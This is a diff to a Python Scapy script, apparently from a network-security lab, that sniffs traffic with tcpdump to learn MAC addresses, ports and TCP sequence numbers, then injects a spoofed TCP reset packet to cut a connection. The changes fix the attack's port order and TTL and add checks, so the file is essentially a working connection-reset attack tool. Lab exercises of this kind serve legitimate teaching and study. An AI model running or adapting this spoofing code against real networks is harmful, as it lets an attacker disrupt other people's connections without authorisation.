@@ -21,12 +21,12 @@ def send_rst_packet(srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackN
 	log('sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
 
 	tcp = TCP(flags="RA")
-	tcp.dport=int(srcPort)
-	tcp.sport=int(dstPort)
+	tcp.sport=int(srcPort)
+	tcp.dport=int(dstPort)
 	tcp.seq=int(seqNum)
 	tcp.ack=int(ackNum)
 
-	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=1)/tcp
+	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=255)/tcp
 
 	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet
 
@@ -46,8 +46,6 @@ def extract_address_port(value):
 
 
 def extract_ports_and_numbers(row):
-	print row
-
 	srcPort, dstPort, seqNum, ackNum = None, None, None, None
 
 	values = row.split(' ')
@@ -90,30 +88,34 @@ def retrieve_atk1_mac_address(iface):
 	return None
 
 
-def extract_r2_mac_addresses(row):
+def extract_r2_mac_addresses(row, ip_address):
 	values = row.split(' ')
 
-	if '9.0.0.2' in values[9]:
+	if ip_address in values[9]:
 		return values[1].replace(',','')
 
-	if '9.0.0.2' in values[11]:
+	if ip_address in values[11]:
 		return values[3].replace(',','')
 
 	return None
 
 
-def retrieve_r2_mac_address():
-	p = Popen(('sudo', 'tcpdump', '-i', 'atk1-eth0', '-lnSe'), stdout=PIPE)
+def retrieve_r2_mac_address(iface, ip_address):
+	print 'retrieving r2 mac addres'
+
+	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnSe'), stdout=PIPE)
 
 	r2_mac_address = None
 
 	for row in iter(p.stdout.readline, b''):
-		r2_mac_address = extract_r2_mac_addresses(row)
+		r2_mac_address = extract_r2_mac_addresses(row, ip_address)
+
+		print r2_mac_address
 
 		if r2_mac_address != None:
-			break
+			p.kill()
 
-	p.kill()
+			break
 
 	return r2_mac_address
 
@@ -136,14 +138,22 @@ def retrieve_ports_and_numbers():
 
 def main():
 	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
+	assert src_mac_address is not None
 	print 'source MAC address', src_mac_address
 
-	dst_mac_address = retrieve_r2_mac_address()
+	dst_mac_address = retrieve_r2_mac_address('atk1-eth1', '9.0.1.1')
+	assert dst_mac_address is not None
 	print 'destination MAC address', dst_mac_address
 
 	srcPort, dstPort, seqNum, ackNum = retrieve_ports_and_numbers()
-	print srcPort, dstPort
-	print seqNum, ackNum
+	assert srcPort is not None
+	assert dstPort is not None
+	assert seqNum is not None
+	assert ackNum is not None
+	print 'source port', srcPort
+	print 'destination port', dstPort
+	print 'sequence number', seqNum
+	print 'acknowledge number', ackNum
 
 	send_rst_packet(src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum)
 
